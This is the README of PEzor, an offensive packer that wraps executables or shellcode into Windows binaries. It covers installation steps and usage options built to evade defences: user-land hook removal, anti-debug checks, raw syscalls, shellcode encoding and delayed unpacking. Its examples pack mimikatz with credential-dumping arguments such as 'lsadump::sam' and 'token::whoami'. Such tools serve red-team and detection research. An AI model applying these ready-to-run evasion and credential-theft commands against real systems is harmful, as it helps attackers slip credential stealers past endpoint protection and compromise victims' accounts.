PEzor
=====

Read the blog post here: [https://iwantmore.pizza/posts/PEzor.html](https://iwantmore.pizza/posts/PEzor.html)

```raw
 ________________
< PEzor!! v1.0.0 >
 ----------------
      \                    / \  //\
       \    |\___/|      /   \//  \\
            /0  0  \__  /    //  | \ \
           /     /  \/_/    //   |  \  \
           @_^_@'/   \/_   //    |   \   \
           //_^_/     \/_ //     |    \    \
        ( //) |        \///      |     \     \
      ( / /) _|_ /   )  //       |      \     _\
    ( // /) '/,_ _ _/  ( ; -.    |    _ _\.-~        .-~~~^-.
  (( / / )) ,-{        _      `-.|.-~-.           .~         `.
 (( // / ))  '/\      /                 ~-. _ .-~      .-~^-.  \
 (( /// ))      `.   {            }                   /      \  \
  (( / ))     .----~-.\        \-'                 .~         \  `. \^-.
             ///.----..>        \             _ -~             `.  ^-`  ^-_
               ///-._ _ _ _ _ _ _}^ - - - - ~                     ~-- ,.-~
                                                                  /.-~
---------------------------------------------------------------------------
```

<!-- toc -->
* [Installation](#installation)
* [Usage](#usage)
<!-- tocstop -->

<!-- install -->
# Installation
The `install.sh` is designed to work on a Kali Linux distro.
```sh-session
$ git clone https://github.com/phra/PEzor.git
$ cd PEzor
$ sudo bash install.sh
$ bash PEzor.sh -h
```
<!-- installstop -->

<!-- usage -->
# Usage
* [`PEzor -h`](#PEzor-help)
* [`PEzor <EXECUTABLE> [donut args...]`](#PEzor-executable)
* [`PEzor <SHELLCODE>`](#PEzor-shellcode)
<!-- usagestop -->

<!-- pezor-help -->
## `PEzor help`

display help for PEzor

```
USAGE
  $ PEzor help
```
<!-- pezor-helpstop -->

<!-- pezor-executable -->
## `PEzor <EXECUTABLE>`

Pack the provided executable into a new one

```
USAGE
  $ PEzor [options...] <EXECUTABLE> [donut args...]

OPTIONS
  -h                        Show usage and exits
  -32                       Force 32-bit executable
  -64                       Force 64-bit executable
  -debug                    Generate a debug build
  -unhook                   User-land hooks removal
  -antidebug                Add anti-debug checks
  -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]
  -sgn                      Encode the generated shellcode with sgn
  -text                     Store shellcode in .text section instead of .data
  -self                     Execute the shellcode in the same thread [requires RX shellcode, not compatible with -sgn]
  -sleep=N                  Sleeps for N seconds before unpacking the shellcode
  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll)
  [donut args...]           After the executable to pack, you can pass additional Donut args, such as -z 2

EXAMPLES
  # 64-bit (self-inject)
  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/x64/mimikatz.exe -z 2
  # 64-bit (raw syscalls)
  $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 mimikatz/x64/mimikatz.exe -z 2
  # 64-bit (reflective dll)
  $ PEzor.sh -format=reflective-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (service exe)
  $ PEzor.sh -format=service-exe mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 64-bit (service dll)
  $ PEzor.sh -format=service-dll mimikatz/x64/mimikatz.exe -z 2 -p '"log c:\users\public\mimi.out" "token::whoami" "exit"'
  # 32-bit (self-inject)
  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
  # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2
  # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread) and arguments for donut
  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 mimikatz/Win32/mimikatz.exe -z 2 "-plsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv"
```
<!-- pezor-executablestop -->

<!-- pezor-shellcode -->
## `PEzor <SHELLCODE>`

Pack the provided shellcode into an executable

```
USAGE
  $ PEzor <-32|-64> [options...] <SHELLCODE>

OPTIONS
  -h                        Show usage and exits
  -32                       Force 32-bit executable
  -64                       Force 64-bit executable
  -debug                    Generate a debug build
  -unhook                   User-land hooks removal
  -antidebug                Add anti-debug checks
  -syscalls                 Use raw syscalls [64-bit only] [Windows 10 only]
  -sgn                      Encode the provided shellcode with sgn
  -text                     Store shellcode in .text section instead of .data
  -self                     Execute the shellcode in the same thread [requires RX shellcode, not compatible with -sgn]
  -sleep=N                  Sleeps for N seconds before unpacking the shellcode
  -format=FORMAT            Outputs result in specified FORMAT (exe, dll, reflective-dll, service-exe, service-dll)

EXAMPLES
  # 64-bit (self-inject)
  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
  # 64-bit (raw syscalls)
  $ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=120 shellcode.bin
  # 64-bit (reflective dll)
  $ PEzor.sh -format=reflective-dll shellcode.bin
  # 64-bit (service exe)
  $ PEzor.sh -format=service-exe shellcode.bin
  # 64-bit (service dll)
  $ PEzor.sh -format=service-dll shellcode.bin
  # 32-bit (self-inject)
  $ PEzor.sh -unhook -antidebug -text -self -sleep=120 shellcode.bin
  # 32-bit (Win32 API: VirtualAlloc/WriteMemoryProcess/CreateRemoteThread)
  $ PEzor.sh -sgn -unhook -antidebug -text -sleep=120 shellcode.bin
```

_See code: [PEzor.sh](https://github.com/phra/PEzor/blob/master/PEzor.sh)_
<!-- pezor-shellcodestop -->
